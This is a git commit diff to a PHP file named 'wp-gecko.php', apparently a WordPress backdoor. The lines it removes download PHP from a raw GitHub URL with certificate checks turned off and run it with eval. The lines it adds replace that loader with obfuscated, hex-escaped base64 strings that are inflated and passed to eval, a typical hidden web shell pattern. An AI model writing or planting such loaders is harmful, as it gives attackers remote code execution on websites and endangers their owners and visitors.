e199bf85955ccc1c25222a9592e37a6fb08b5847
eagles227 <166109731+eagles227@users.noreply.github.com>
2025-02-14 13:50:48 +0700

    Update wp-gecko.php

--- wp-gecko.php
+++ wp-gecko.php
@@ -1,21 +1,5 @@
 <?php
-function getURL($url) {
-    if (function_exists('curl_version')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_HEADER, 0);
-        $data = curl_exec($ch);
-        curl_close($ch);
-        return $data;
-    }
-    return false;
-}
-
-// Contoh penggunaan:
-$phpCode = getURL('https://raw.githubusercontent.com/eagles227/claudia/main/gecko.php');
-if ($phpCode !== false) {
-    eval("?>". $phpCode);
-}
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "YL\x62FSY\x42rY\x61FHm\x2bx\x42x8J6h0\x41/ktOtwzKdI2rxNhuKqy9ZuIe/oG9q3fG61pZ96r\x42yw/HUtgRZHJ\x61jur0VUdj\x42M\x41Fqqq4RmHp\x42Gty\x61YSxulj\x43GUtV1Nn\x43DM\x424SzPJ\x61Xh29F/WTeqD6sJVmhUEZykEeMIusSdYX2R\x63W3QziK15ftF\x61yZzsg5Iy/\x43Iuu29nmXDl7s\x63HVKYv9N7PutM30J/\x43hLvMkV6qv0Nd8X8UGilsxS9i\x41VFUy3LRSn9hr/KxQpfzzeKsXGnmPWS9in5\x2b4yK\x62f5\x42WQeSg\x43pz6H\x62LM\x43ZYI\x43pFhkdxT/ud2hp\x627Fx4WkWeNwISwZxh0R\x42\x42y\x63\x2bQsOpLvQvKDeTg3yIQ\x42jhPITQOnrmZVS76\x62X\x6373\x2bDeJm9Gru\x61L9\x2b/P2qNM\x62xQyJXSLJV4vhKhzYHUxJV\x63zgvZQqFQTKy/R/L\x2b\x42\x42M\x43v23R1o/GHQO\x42wJe\x2bv\x62\x41EFg/2GQS\x42wJe\x2bv\x61\x41UFg/mGQW\x42wJe\x2bvZ\x41kFg/WGQ\x61\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
 ?>
